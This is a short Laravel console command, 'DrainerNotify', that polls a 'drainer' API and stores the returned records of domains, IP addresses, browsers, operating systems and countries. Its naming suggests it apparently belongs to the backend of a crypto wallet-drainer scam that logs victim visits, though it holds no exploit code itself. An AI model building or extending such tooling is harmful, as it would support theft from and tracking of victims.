<?php

namespace App\Console\Commands;

use App\Models\DrainerLog;
use Illuminate\Console\Command;
use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;
class DrainerNotify extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'command:drainerNotify';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $url = env("DRAINER_API_URL")."/api/retrive";
        $data = ['access_token' => getenv('DRAINER_API_KEY')];
        $client = new Client();
        try {
            $response = $client->post($url, [
                'json' => $data
            ]);

            $statusCode = $response->getStatusCode();
            $content = $response->getBody()->getContents();
            $json_data = json_decode($content, true);
//           dd($json_data);
            if($json_data['data'] == []){
                return;
            }

            foreach ($json_data['data'] as $item){
                $notify = new DrainerLog();
                $notify->domain = $item['domain'];
                $notify->type = $item['type'];
                $notify->OS = isset($item['OS']) ? $item['OS'] : "unknown";
                $notify->browser = isset($item['browser']) ? $item['browser'] : "unknown";
                $notify->IP = $item['IP'];
                $notify->country = isset($item['country']) ? $item['country'] : "unknown";
                $notify->ts = $item['ts'];
                $notify->save();


            }
        } catch (RequestException $e) {
            dd($e->getMessage());
        }
    }
}
